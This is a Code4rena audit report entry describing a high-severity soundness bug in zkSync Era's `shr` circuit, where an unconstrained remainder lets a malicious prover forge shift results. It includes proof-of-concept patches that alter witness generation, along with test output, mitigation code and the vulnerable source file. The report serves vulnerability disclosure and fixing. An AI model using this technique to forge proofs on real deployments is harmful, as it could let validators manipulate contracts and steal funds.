{
  "Title": "[H-04] Missing constraint on remainder in `shr` opcode implementation",
  "Content": "\nThe `main_vm` circuit uses a `MulDivRelation` to constrain the result of a `shr` instruction by converting a right shift into a division by a shift constant.\n\n<https://github.com/code-423n4/2023-10-zksync/blob/main/code/era-zkevm_circuits/src/main_vm/opcodes/shifts.rs#L76>\n\n```rust\nlet full_shift_limbs = get_shift_constant(cs, full_shift);\n...\nlet (rshift_q, _rshift_r) = allocate_div_result_unchecked(cs, &reg, &full_shift_limbs);\n...\n// actual enforcement:\n// for left_shift: a = reg, b = full_shuft, remainder = 0, high = lshift_high, low = lshift_low\n// for right_shift : a = rshift_q, b = full_shift, remainder = rshift_r, high = 0, low = reg\nlet uint256_zero = UInt256::zero(cs);\n\nlet rem_to_enforce =\n    UInt32::parallel_select(cs, apply_left_shift, &uint256_zero.inner, &_rshift_r);\nlet a_to_enforce = UInt32::parallel_select(cs, apply_left_shift, reg, &rshift_q);\nlet b_to_enforce = full_shift_limbs;\nlet mul_low_to_enforce = UInt32::parallel_select(cs, apply_left_shift, &lshift_low, reg);\nlet mul_high_to_enforce =\n    UInt32::parallel_select(cs, apply_left_shift, &lshift_high, &uint256_zero.inner);\n\nlet mul_relation = MulDivRelation {\n    a: a_to_enforce,\n    b: b_to_enforce,\n    rem: rem_to_enforce,\n    mul_low: mul_low_to_enforce,\n    mul_high: mul_high_to_enforce,\n};\n```\n\nHowever, the circuit fails to constrain the remainder to be less than the divisor. This allows a malicious prover to set the result to any value less than or equal to the correct result (and possibly any value, but this has not be verified).\n\n### Impact\n\nA malicious validator could generate and submit a proof with incorrect behavior of the `shr` instruction. This would allow the validator to manipulate the behavior of smart contracts that use a `shr` instruction. For example, the validator could manipulate the calculated price during the execution of an on-chain DEX and steal all of the assets in the DEX. The elliptic curve precompiles also to make extensive use of shift instructions. Since every smart contract that uses a `shr` instruction is affected, it is impossible to enumerate all potential impacts.\n\nThis vulnerability also affects the deployed circuits that utilize bellman instead of boojum.\n\n### Proof of Concept\n\nFor the ease of testing, we forked the zkSync Era test harness into a monorepo containing the VM and circuit code: <https://github.com/chainlight-io/zksync-era-boojum-test-harness>. The patch below can be applied to the test code to demonstrate the vulnerability:\n\n<details>\n\n```diff\ndiff --git a/run.sh b/run.sh\nindex 91e97da..97e2d3b 100644\n--- a/run.sh\n+++ b/run.sh\n@@ -1,2 +1,3 @@\n #!/bin/sh\n-cd zkevm_test_harness && RUST_MIN_STACK=$((8*1024*1024)) cargo test --jobs 1 -- --nocapture run_simple\n+# XXX must run as release to avoid debug asserts\n+cd zkevm_test_harness && RUST_MIN_STACK=$((8*1024*1024)) cargo test --jobs 1 --release -- --nocapture run_simple && RUST_MIN_STACK=$((8*1024*1024)) cargo test --jobs 1 --release -- --nocapture run_hack\ndiff --git a/zk_evm/src/opcodes/execution/shift.rs b/zk_evm/src/opcodes/execution/shift.rs\nindex 010181a..56fbd5f 100644\n--- a/zk_evm/src/opcodes/execution/shift.rs\n+++ b/zk_evm/src/opcodes/execution/shift.rs\n@@ -52,7 +52,11 @@ impl<const N: usize, E: VmEncodingMode<N>> DecodedOpcode<N, E> {\n                 result = result | src0.shl(256u32 - shift_abs as u32);\n             }\n \n-            result\n+            if src0 == U256::from(1337u32) {\n+                U256::zero()\n+            } else {\n+                result\n+            }\n         } else {\n             let mut result = src0.shl(shift_abs as u32);\n             if is_cyclic {\ndiff --git a/zkevm_circuits/src/main_vm/opcodes/mul_div.rs b/zkevm_circuits/src/main_vm/opcodes/mul_div.rs\nindex dbfbeb3..2251e12 100644\n--- a/zkevm_circuits/src/main_vm/opcodes/mul_div.rs\n+++ b/zkevm_circuits/src/main_vm/opcodes/mul_div.rs\n@@ -169,6 +169,89 @@ pub fn allocate_div_result_unchecked<F: SmallField, CS: ConstraintSystem<F>>(\n     (quotient, remainder)\n }\n \n+pub fn allocate_div_result_unchecked_hack<F: SmallField, CS: ConstraintSystem<F>>(\n+    cs: &mut CS,\n+    a: &[UInt32<F>; 8],\n+    b: &[UInt32<F>; 8],\n+) -> ([UInt32<F>; 8], [UInt32<F>; 8]) {\n+    let quotient = cs.alloc_multiple_variables_without_values::<8>();\n+    let remainder = cs.alloc_multiple_variables_without_values::<8>();\n+\n+    if <CS::Config as CSConfig>::WitnessConfig::EVALUATE_WITNESS {\n+        let value_fn = move |inputs: [F; 16]| {\n+            let a = allocate_u256_from_limbs(&inputs[0..8]);\n+            let b = allocate_u256_from_limbs(&inputs[8..16]);\n+\n+            let (quotient, remainder) = if a == U256::from(1337u32) {\n+                (U256::zero(), a)\n+            } else if b.is_zero() {\n+                (U256::zero(), U256::zero())\n+            } else {\n+                a.div_mod(b)\n+            };\n+\n+            let mut outputs = [F::ZERO; 16];\n+            for (dst, src) in outputs[..8]\n+                .iter_mut()\n+                .zip(decompose_u256_as_u32x8(quotient).into_iter())\n+            {\n+                *dst = F::from_u64_unchecked(src as u64);\n+            }\n+            for (dst, src) in outputs[8..]\n+                .iter_mut()\n+                .zip(decompose_u256_as_u32x8(remainder).into_iter())\n+            {\n+                *dst = F::from_u64_unchecked(src as u64);\n+            }\n+\n+            outputs\n+        };\n+\n+        let dependencies = Place::from_variables([\n+            a[0].get_variable(),\n+            a[1].get_variable(),\n+            a[2].get_variable(),\n+            a[3].get_variable(),\n+            a[4].get_variable(),\n+            a[5].get_variable(),\n+            a[6].get_variable(),\n+            a[7].get_variable(),\n+            b[0].get_variable(),\n+            b[1].get_variable(),\n+            b[2].get_variable(),\n+            b[3].get_variable(),\n+            b[4].get_variable(),\n+            b[5].get_variable(),\n+            b[6].get_variable(),\n+            b[7].get_variable(),\n+        ]);\n+        let outputs = Place::from_variables([\n+            quotient[0],\n+            quotient[1],\n+            quotient[2],\n+            quotient[3],\n+            quotient[4],\n+            quotient[5],\n+            quotient[6],\n+            quotient[7],\n+            remainder[0],\n+            remainder[1],\n+            remainder[2],\n+            remainder[3],\n+            remainder[4],\n+            remainder[5],\n+            remainder[6],\n+            remainder[7],\n+        ]);\n+        cs.set_values_with_dependencies(&dependencies, &outputs, value_fn);\n+    }\n+\n+    let quotient = quotient.map(|el| unsafe { UInt32::from_variable_unchecked(el) });\n+    let remainder = remainder.map(|el| unsafe { UInt32::from_variable_unchecked(el) });\n+\n+    (quotient, remainder)\n+}\n+\n pub fn all_limbs_are_zero<F: SmallField, CS: ConstraintSystem<F>>(\n     cs: &mut CS,\n     limbs: &[UInt32<F>; 8],\ndiff --git a/zkevm_circuits/src/main_vm/opcodes/shifts.rs b/zkevm_circuits/src/main_vm/opcodes/shifts.rs\nindex e3260fd..8049876 100644\n--- a/zkevm_circuits/src/main_vm/opcodes/shifts.rs\n+++ b/zkevm_circuits/src/main_vm/opcodes/shifts.rs\n@@ -79,7 +79,7 @@ pub(crate) fn apply_shifts<F: SmallField, CS: ConstraintSystem<F>>(\n         let x = is_cyclic.negated(cs);\n         is_right.and(cs, x)\n     };\n-    let (rshift_q, _rshift_r) = allocate_div_result_unchecked(cs, &reg, &full_shift_limbs);\n+    let (rshift_q, _rshift_r) = allocate_div_result_unchecked_hack(cs, &reg, &full_shift_limbs);\n \n     let apply_left_shift = {\n         let x = is_right_shift.negated(cs);\ndiff --git a/zkevm_test_harness/src/tests/run_manually.rs b/zkevm_test_harness/src/tests/run_manually.rs\nindex 76ac16c..47a28cb 100644\n--- a/zkevm_test_harness/src/tests/run_manually.rs\n+++ b/zkevm_test_harness/src/tests/run_manually.rs\n@@ -41,6 +41,39 @@ fn run_simple() {\n         log.event.first r1, r2, r0\n         log.to_l1.first r1, r2, r0\n \n+        add! 1336, r0, r1\n+        add! 1, r0, r2\n+        shr r1, r2, r3\n+        sstore r3, r0\n+\n+        ret.ok r0\n+    \"#;\n+\n+    run_and_try_create_witness_inner(asm, 50);\n+}\n+\n+#[test]\n+fn run_hack() {\n+    let asm = r#\"\n+        .text\n+        .file\t\"Test_26\"\n+        .rodata.cst32\n+        .p2align\t5\n+        .text\n+        .globl\t__entry\n+    __entry:\n+    .main:\n+        add 1, r0, r1\n+        add 2, r0, r2\n+        sstore r1, r2\n+        log.event.first r1, r2, r0\n+        log.to_l1.first r1, r2, r0\n+\n+        add! 1337, r0, r1\n+        add! 1, r0, r2\n+        shr r1, r2, r3\n+        sstore r3, r0\n+\n         ret.ok r0\n     \"#;\n```\n\n</details>\n\nWe demonstrate the vulnerability by modifying the witness generation code to generate witnesses that should not be provable when the value `1337` is in a source operand. There are two tests that will run: source value of `1336` to show the normal behavior, and source value of `1337` to show the vulnerable behavior.\n\nThe relevant output of `run.sh` is the VM registers during the execution trace and is included below:\n\n    Made snapshot at cycle 1029\n    [src/witness/tracer.rs:270] vm_local_state.registers[0].value = 1336 <-- dividend and divisor\n    [src/witness/tracer.rs:271] vm_local_state.registers[1].value = 2\n    [src/witness/tracer.rs:272] vm_local_state.registers[2].value = 0\n    [src/witness/tracer.rs:273] vm_local_state.registers[3].value = 0\n    [src/witness/tracer.rs:270] vm_local_state.registers[0].value = 1336\n    [src/witness/tracer.rs:271] vm_local_state.registers[1].value = 1 <-- quotient\n    [src/witness/tracer.rs:272] vm_local_state.registers[2].value = 0 <-- remainder\n    [src/witness/tracer.rs:273] vm_local_state.registers[3].value = 0\n    ...\n\n    Made snapshot at cycle 1029\n    [src/witness/tracer.rs:270] vm_local_state.registers[0].value = 1337 <-- dividend and divisor\n    [src/witness/tracer.rs:271] vm_local_state.registers[1].value = 2\n    [src/witness/tracer.rs:272] vm_local_state.registers[2].value = 0\n    [src/witness/tracer.rs:273] vm_local_state.registers[3].value = 0\n    [src/witness/tracer.rs:270] vm_local_state.registers[0].value = 1337\n    [src/witness/tracer.rs:271] vm_local_state.registers[1].value = 0 <-- quotient\n    [src/witness/tracer.rs:272] vm_local_state.registers[2].value = 1337 <-- remainder\n    [src/witness/tracer.rs:273] vm_local_state.registers[3].value = 0\n    ...\n\nWe see that the result of the `shr` instruction in the normal example is as expected: `1336 >> 1 = 668`. However, in the vulnerable example, the result is incorrect: `1337 >> 1 = 0`. While we chose to set the result to zero, it could be other values as well.\n\n### Proof of Concept (deployed version)\n\nThe current zkSync Era circuits are built on bellman and franklin-crypto, but are similar in logic to the in-scope circuits built on boojum. We confirmed that this vulnerability is also present in the current circuits with a similar demonstration.\n\nFor the ease of testing, we forked the zkSync Era test harness into a monorepo containing the VM and circuit code: <https://github.com/chainlight-io/zksync-era-bellman-test-harness>. The patch below can be applied to the test code to demonstrate the vulnerability:\n\n<details>\n\n```diff\ndiff --git a/run.sh b/run.sh\nindex 0d6b823..b897364 100644\n--- a/run.sh\n+++ b/run.sh\n@@ -1,2 +1,2 @@\n #!/bin/sh\n-cd zkevm_test_harness && cargo test -- --nocapture run_simple\n+cd zkevm_test_harness && cargo test -- --nocapture run_simple && cargo test -- --nocapture run_hack\ndiff --git a/sync_vm/src/vm/optimizer/optimization_context.rs b/sync_vm/src/vm/optimizer/optimization_context.rs\nindex 5c6b972..e242f18 100644\n--- a/sync_vm/src/vm/optimizer/optimization_context.rs\n+++ b/sync_vm/src/vm/optimizer/optimization_context.rs\n@@ -888,6 +888,29 @@ impl<E: Engine> OptimizationContext<E> {\n         }\n     }\n \n+    fn make_witness_for_division_hack(\n+        a: &AsU128x2<E>,\n+        b: &AsU64x4<E>,\n+    ) -> (Option<BigUint>, Option<BigUint>) {\n+        match (a.get_value(), b.get_value()) {\n+            (Some(a), Some(b)) => {\n+                use num_traits::Zero;\n+                if b.is_zero() {\n+                    (Some(BigUint::from(0u64)), Some(a))\n+                } else {\n+                    if a == BigUint::from(1337u32) {\n+                        (Some(BigUint::from(0u64)), Some(a))\n+                    } else {\n+                        use num_integer::Integer;\n+                        let (q, r) = a.div_rem(&b);\n+                        (Some(q), Some(r))\n+                    }\n+                }\n+            }\n+            _ => (None, None),\n+        }\n+    }\n+\n     #[track_caller]\n     pub fn add_zero_check<CS: ConstraintSystem<E>>(\n         &mut self,\n@@ -1104,6 +1127,40 @@ impl<E: Engine> OptimizationContext<E> {\n         Ok((quotient.into(), remainder.into()))\n     }\n \n+    #[track_caller]\n+    pub fn add_div_relation_shift<CS: ConstraintSystem<E>>(\n+        &mut self,\n+        cs: &mut CS,\n+        dividend_view: &RegisterInputView<E>,\n+        divisor_view: &RegisterInputView<E>,\n+        applies: Boolean,\n+        marker: CtxMarker,\n+    ) -> Result<(RegisterInputView<E>, RegisterInputView<E>), SynthesisError> {\n+        let dividend = AsU128x2::from(dividend_view);\n+        let divisor = AsU64x4::from(divisor_view);\n+\n+        let (witness_quotient, witness_remainder) =\n+            Self::make_witness_for_division_hack(&dividend, &divisor);\n+        let quotient =\n+            BothReprs::alloc_checked(cs, witness_quotient, applies.clone(), self, marker)?;\n+        let remainder =\n+            BothReprs::alloc_checked(cs, witness_remainder, applies.clone(), self, marker)?;\n+\n+        // a, b, high, low, remainder\n+        // for a relationship like a*b + remainder = 2^256 * high + low\n+        // and here we have for a/b = q and a%b = r\n+        // q*m + r = 2^256 * 0 + input\n+        let relation = MulDivRelationship::new(\n+            divisor,\n+            quotient.as_u64x4.clone(),\n+            remainder.as_u128x2.clone(),\n+            AsU128x2::zero(),\n+            dividend,\n+        );\n+        self.uint256_divmul_tuples.push((marker, applies, relation));\n+        Ok((quotient.into(), remainder.into()))\n+    }\n+\n     #[track_caller]\n     pub fn add_pending_div_relation<CS: ConstraintSystem<E>>(\n         &mut self,\ndiff --git a/sync_vm/src/vm/vm_cycle/opcode_execution/shift.rs b/sync_vm/src/vm/vm_cycle/opcode_execution/shift.rs\nindex 7aa8707..eeac589 100644\n--- a/sync_vm/src/vm/vm_cycle/opcode_execution/shift.rs\n+++ b/sync_vm/src/vm/vm_cycle/opcode_execution/shift.rs\n@@ -141,7 +141,7 @@ pub(crate) fn apply<\n     let is_right_shift = Boolean::and(cs, &is_right, &is_cyclic.not())?;\n     let apply_right_shift = Boolean::and(cs, &should_apply, &is_right_shift)?;\n     let (rshift_q, _rshift_r) =\n-        optimizer.add_div_relation(cs, &reg, &full_shift, apply_right_shift, marker)?;\n+        optimizer.add_div_relation_shift(cs, &reg, &full_shift, apply_right_shift, marker)?;\n \n     // for left_shift: a = reg, b = full_shuft, remainder = 0, high = lshift_high, low = lshift_low\n     let next_marker = marker.advance();\ndiff --git a/zk_evm/src/opcodes/execution/shift.rs b/zk_evm/src/opcodes/execution/shift.rs\nindex 9db48e0..bff9c4e 100644\n--- a/zk_evm/src/opcodes/execution/shift.rs\n+++ b/zk_evm/src/opcodes/execution/shift.rs\n@@ -50,7 +50,11 @@ impl<const N: usize, E: VmEncodingMode<N>> DecodedOpcode<N, E> {\n                 result = result | src0.shl(256u32 - shift_abs as u32);\n             }\n \n-            result\n+            if src0 == U256::from(1337u32) {\n+                U256::from(0u32)\n+            } else {\n+                result\n+            }\n         } else {\n             let mut result = src0.shl(shift_abs as u32);\n             if is_cyclic {\ndiff --git a/zkevm_test_harness/src/tests/run_manually.rs b/zkevm_test_harness/src/tests/run_manually.rs\nindex f640615..ef96e22 100644\n--- a/zkevm_test_harness/src/tests/run_manually.rs\n+++ b/zkevm_test_harness/src/tests/run_manually.rs\n@@ -40,6 +40,39 @@ fn run_simple() {\n         log.event.first r1, r2, r0\n         log.to_l1.first r1, r2, r0\n \n+        add! 1336, r0, r1\n+        add! 1, r0, r2\n+        shr r1, r2, r3\n+        sstore r3, r0\n+\n+        ret.ok r0\n+    \"#;\n+\n+    run_and_try_create_witness_inner(asm, 50);\n+}\n+\n+#[test]\n+fn run_hack() {\n+    let asm = r#\"\n+        .text\n+        .file\t\"Test_26\"\n+        .rodata.cst32\n+        .p2align\t5\n+        .text\n+        .globl\t__entry\n+    __entry:\n+    .main:\n+        add 1, r0, r1\n+        add 2, r0, r2\n+        sstore r1, r2\n+        log.event.first r1, r2, r0\n+        log.to_l1.first r1, r2, r0\n+\n+        add! 1337, r0, r1\n+        add! 1, r0, r2\n+        shr r1, r2, r3\n+        sstore r3, r0\n+\n         ret.ok r0\n     \"#;\n```\n\n</details>\n\nWe demonstrate the vulnerability by modifying the witness generation code to generate witnesses that should not be provable when the value `1337` is in a source operand. There are two tests that will run: source value of `1336` to show the normal behavior, and source value of `1337` to show the vulnerable behavior.\n\nThe relevant output of `run.sh` is the VM registers during the execution trace and is included below:\n\n    [src/witness/tracer.rs:282] vm_local_state.registers[0].value = 1336 <-- value to shift\n    [src/witness/tracer.rs:283] vm_local_state.registers[1].value = 1 <-- shift amount\n    [src/witness/tracer.rs:284] vm_local_state.registers[2].value = 0\n    [src/witness/tracer.rs:285] vm_local_state.registers[3].value = 0\n    Made snapshot at cycle 1034\n    [src/witness/tracer.rs:282] vm_local_state.registers[0].value = 1336\n    [src/witness/tracer.rs:283] vm_local_state.registers[1].value = 1\n    [src/witness/tracer.rs:284] vm_local_state.registers[2].value = 668 <-- result\n    [src/witness/tracer.rs:285] vm_local_state.registers[3].value = 0\n    ...\n\n    [src/witness/tracer.rs:282] vm_local_state.registers[0].value = 1337 <-- value to shift\n    [src/witness/tracer.rs:283] vm_local_state.registers[1].value = 1 <-- shift amount\n    [src/witness/tracer.rs:284] vm_local_state.registers[2].value = 0\n    [src/witness/tracer.rs:285] vm_local_state.registers[3].value = 0\n    Made snapshot at cycle 1034\n    [src/witness/tracer.rs:282] vm_local_state.registers[0].value = 1337\n    [src/witness/tracer.rs:283] vm_local_state.registers[1].value = 1\n    [src/witness/tracer.rs:284] vm_local_state.registers[2].value = 0 <-- result\n    [src/witness/tracer.rs:285] vm_local_state.registers[3].value = 0\n    ...\n\nWe see that the result of the `shr` instruction in the normal example is as expected: `1336 >> 1 = 668`. However, in the vulnerable example, the result is incorrect: `1337 >> 1 = 0`. While we chose to set the result to zero, it could be other values as well.\n\n### Recommended Mitigation Steps\n\nThe `div` instruction already has code to enforce the remainder to be less than the divisor. This code could be copied to the `shr` implementation, keeping in mind to fix the vulnerability we identified in the `div` implementation:\n\n```rust\nlet (rshift_q, rshift_r) = allocate_div_result_unchecked(cs, &reg, &full_shift_limbs);\nlet (subtraction_result_unchecked, remainder_is_less_than_divisor) =\n    allocate_subtraction_result_unchecked(cs, &rshift_r, &full_shift_limbs);\nlet subtraction_result = subtraction_result_unchecked.map(|el| UInt32::from_variable_checked(cs, el.get_variable()));\n\n// relation is a + b == c + of * 2^N,\n// but we compute d - e + 2^N * borrow = f\n\n// so we need to shuffle\nlet addition_relation = AddSubRelation {\n    a: full_shift_limbs,\n    b: subtraction_result,\n    c: rshift_r,\n    of: remainder_is_less_than_divisor,\n};\n\n// for right shift, we require that remainder is < divisor\nremainder_is_less_than_divisor.conditionally_enforce_true(cs, is_right_shift);\n```\n\n### Recommended Mitigation Steps (deployed version)\n\nThe `div` instruction already has code to enforce the remainder to be less than the divisor. This code could be copied to the `shr` implementation.\n\n```rust\nlet mut full_shift = RegisterInputView {\n    u8x32_view: None,\n    lowest160: None,\n    decomposed_lowest160: None,\n    u64x4_view: Some([chunk0, chunk1, chunk2, chunk3]),\n    u128x2_view: Some(AsU128x2::from_uint256(cs, &UInt256 {\n        inner: [chunk0, chunk1, chunk2, chunk3],\n    })?.inner),\n    u32x8_view: None,\n    is_ptr: Boolean::Constant(false),\n};\n...\nlet (rshift_q, rshift_r) =\n    optimizer.add_div_relation_shift(cs, &reg, &full_shift, apply_right_shift, marker)?;\n// add check that remainder is smaller than divisor (if it is not zero)\n// divisor - remainder + 2^256 * borrow = c =>\n// c + remainder = divisor + borrow * 2^256;\nlet (_result, borrow) =\n    optimizer.add_subtraction_relation(cs, &full_shift, &rshift_r, apply_right_shift, marker)?;\n\n// borrow == 0 enforces only that remainder <= divisor\n// however we want to enforce that remainder < divisor\n// to accomplish the latter we additionally check that remainder != divisor\n// the full condition therefore is the following:\n// divisor !=0 => borrow == 0 && remainder != divisor\n// which is equivalent to: divisor_is_zero || (borrow == 0 && remainder != divisor)\n\nlet divisor = full_shift.clone().unwrap_as_register();\nlet remainder = rshift_r.unwrap_as_register();\nlet rem_eq_divisor = Register::equals(cs, &divisor, &remainder)?;\nlet rem_is_less_than_divisor = Boolean::and(cs, &borrow.not(), &rem_eq_divisor.not())?;\nlet first_check = Boolean::or(cs, &is_right_shift.not(), &rem_is_less_than_divisor)?;\nBoolean::enforce_equal(cs, &first_check, &Boolean::constant(true))?;\n```\n\n**[miladpiri (zkSync) confirmed](https://github.com/code-423n4/2023-10-zksync-findings/issues/697#issuecomment-1794649061)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/697#issuecomment-1830113270):**\n > The Warden has shown how, due to a lack of a constraint, the circuit for `shr` would allow any value that is less than or equal to the correct remainder.\n> \n> The bug has been weaponized to show how it would have allowed incorrect proofs, which may have been used to steal funds or break contracts on-chain.\n\n***\n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/reports/2023-10-zksync",
  "Code": [
    {
      "filename": "code/era-zkevm_circuits/src/main_vm/opcodes/shifts.rs",
      "content": "use super::*;\nuse crate::base_structures::register::VMRegister;\nuse crate::base_structures::vm_state::ArithmeticFlagsPort;\nuse crate::tables::bitshift::*;\nuse arrayvec::ArrayVec;\nuse boojum::gadgets::u256::UInt256;\n\npub(crate) fn apply_shifts<F: SmallField, CS: ConstraintSystem<F>>(\n    cs: &mut CS,\n    _draft_vm_state: &VmLocalState<F>,\n    common_opcode_state: &CommonOpcodeState<F>,\n    _opcode_carry_parts: &AfterDecodingCarryParts<F>,\n    diffs_accumulator: &mut StateDiffsAccumulator<F>,\n) {\n    const SHL_OPCODE: zkevm_opcode_defs::Opcode =\n        zkevm_opcode_defs::Opcode::Shift(zkevm_opcode_defs::definitions::shift::ShiftOpcode::Shl);\n    const ROL_OPCODE: zkevm_opcode_defs::Opcode =\n        zkevm_opcode_defs::Opcode::Shift(zkevm_opcode_defs::definitions::shift::ShiftOpcode::Rol);\n    const SHR_OPCODE: zkevm_opcode_defs::Opcode =\n        zkevm_opcode_defs::Opcode::Shift(zkevm_opcode_defs::definitions::shift::ShiftOpcode::Shr);\n    const ROR_OPCODE: zkevm_opcode_defs::Opcode =\n        zkevm_opcode_defs::Opcode::Shift(zkevm_opcode_defs::definitions::shift::ShiftOpcode::Ror);\n\n    let should_apply = common_opcode_state\n        .decoded_opcode\n        .properties_bits\n        .boolean_for_opcode(SHL_OPCODE);\n\n    if crate::config::CIRCUIT_VERSOBE {\n        if (should_apply.witness_hook(&*cs))().unwrap_or(false) {\n            println!(\"Applying SHIFT\");\n        }\n    }\n\n    let should_set_flags = common_opcode_state\n        .decoded_opcode\n        .properties_bits\n        .flag_booleans[SET_FLAGS_FLAG_IDX];\n\n    let is_rol = common_opcode_state\n        .decoded_opcode\n        .properties_bits\n        .boolean_for_variant(ROL_OPCODE);\n    let is_ror = common_opcode_state\n        .decoded_opcode\n        .properties_bits\n        .boolean_for_variant(ROR_OPCODE);\n    let is_shr = common_opcode_state\n        .decoded_opcode\n        .properties_bits\n        .boolean_for_variant(SHR_OPCODE);\n\n    let is_cyclic = is_rol.or(cs, is_ror);\n    let is_right = is_ror.or(cs, is_shr);\n\n    let reg = &common_opcode_state.src0_view.u32x8_view;\n    let shift = common_opcode_state.src1_view.u8x32_view[0];\n    let shift = shift.into_num();\n\n    // cyclic right rotation x is the same as left cyclic rotation 256 - x\n    let change_rot = is_ror;\n    let shift_is_zero = shift.is_zero(cs);\n    let cnst = Num::allocated_constant(cs, F::from_u64_unchecked(256));\n    // no underflow here\n    let inverted_shift = cnst.sub(cs, &shift);\n\n    let change_flag = {\n        let x = shift_is_zero.negated(cs);\n        change_rot.and(cs, x)\n    };\n    let full_shift = Num::conditionally_select(cs, change_flag, &inverted_shift, &shift);\n\n    // and only NOW it's indeed 8-bit, even if we had a subtraction of 256 - 0 above\n    let full_shift = unsafe { UInt8::from_variable_unchecked(full_shift.get_variable()) };\n\n    let full_shift_limbs = get_shift_constant(cs, full_shift);\n\n    let is_right_shift = {\n        let x = is_cyclic.negated(cs);\n        is_right.and(cs, x)\n    };\n    let (rshift_q, _rshift_r) = allocate_div_result_unchecked(cs, &reg, &full_shift_limbs);\n\n    let apply_left_shift = {\n        let x = is_right_shift.negated(cs);\n        Boolean::multi_and(cs, &[should_apply, x])\n    };\n    let (lshift_low, lshift_high) = allocate_mul_result_unchecked(cs, &reg, &full_shift_limbs);\n\n    // actual enforcement:\n    // for left_shift: a = reg, b = full_shuft, remainder = 0, high = lshift_high, low = lshift_low\n    // for right_shift : a = rshift_q, b = full_shift, remainder = rshift_r, high = 0, low = reg\n    let uint256_zero = UInt256::zero(cs);\n\n    let rem_to_enforce =\n        UInt32::parallel_select(cs, apply_left_shift, &uint256_zero.inner, &_rshift_r);\n    let a_to_enforce = UInt32::parallel_select(cs, apply_left_shift, reg, &rshift_q);\n    let b_to_enforce = full_shift_limbs;\n    let mul_low_to_enforce = UInt32::parallel_select(cs, apply_left_shift, &lshift_low, reg);\n    let mul_high_to_enforce =\n        UInt32::parallel_select(cs, apply_left_shift, &lshift_high, &uint256_zero.inner);\n\n    let mul_relation = MulDivRelation {\n        a: a_to_enforce,\n        b: b_to_enforce,\n        rem: rem_to_enforce,\n        mul_low: mul_low_to_enforce,\n        mul_high: mul_high_to_enforce,\n    };\n\n    let temp_result = UInt32::parallel_select(cs, is_right_shift, &rshift_q, &lshift_low);\n    let overflow = lshift_high;\n    let mut final_result = UInt256::zero(cs).inner;\n\n    let zipped_iter = (temp_result.iter(), overflow.iter(), final_result.iter_mut());\n    for (limb_in, of_in, limb_out) in itertools::multizip(zipped_iter) {\n        // of * is_cyclic + limb_in\n        let res = Num::fma(\n            cs,\n            &of_in.into_num(),\n            &is_cyclic.into_num(),\n            &F::ONE,\n            &limb_in.into_num(),\n            &F::ONE,\n        );\n        *limb_out = unsafe { UInt32::from_variable_unchecked(res.get_variable()) };\n    }\n\n    // Sets an eq flag if out1 is zero\n    let res_is_zero = all_limbs_are_zero(cs, &final_result);\n    let boolean_false = Boolean::allocated_constant(cs, false);\n    let new_flag_port = ArithmeticFlagsPort {\n        overflow_or_less_than: boolean_false,\n        equal: res_is_zero,\n        greater_than: boolean_false,\n    };\n\n    // flags for a case if we do not set flags\n    let set_flags_and_execute = Boolean::multi_and(cs, &[should_apply, should_set_flags]);\n\n    let dst0 = VMRegister {\n        is_pointer: boolean_false,\n        value: UInt256 {\n            inner: final_result,\n        },\n    };\n\n    let can_write_into_memory = SHL_OPCODE.can_write_dst0_into_memory(SUPPORTED_ISA_VERSION);\n\n    diffs_accumulator\n        .dst_0_values\n        .push((can_write_into_memory, should_apply, dst0));\n    diffs_accumulator\n        .flags\n        .push((set_flags_and_execute, new_flag_port));\n\n    let mut mul_div_relations = ArrayVec::new();\n    mul_div_relations.push(mul_relation);\n    diffs_accumulator\n        .mul_div_relations\n        .push((should_apply, mul_div_relations));\n}\n\npub(crate) fn get_shift_constant<F: SmallField, CS: ConstraintSystem<F>>(\n    cs: &mut CS,\n    shift: UInt8<F>,\n) -> [UInt32<F>; 8] {\n    let shift_table_id = cs\n        .get_table_id_for_marker::<BitshiftTable>()\n        .expect(\"table must exist\");\n\n    let mut full_shift_limbs = [UInt32::zero(cs); 8];\n    for (idx, dst) in full_shift_limbs.chunks_mut(2).enumerate() {\n        // shift + idx << 8\n        let summand = Num::allocated_constant(cs, F::from_u64_unchecked((idx << 8) as u64));\n        let key = shift.into_num().add(cs, &summand);\n        let [a, b] = cs.perform_lookup::<1, 2>(shift_table_id, &[key.get_variable()]);\n        unsafe {\n            dst[0] = UInt32::from_variable_unchecked(a);\n            dst[1] = UInt32::from_variable_unchecked(b);\n        }\n    }\n\n    full_shift_limbs\n}"
    }
  ]
}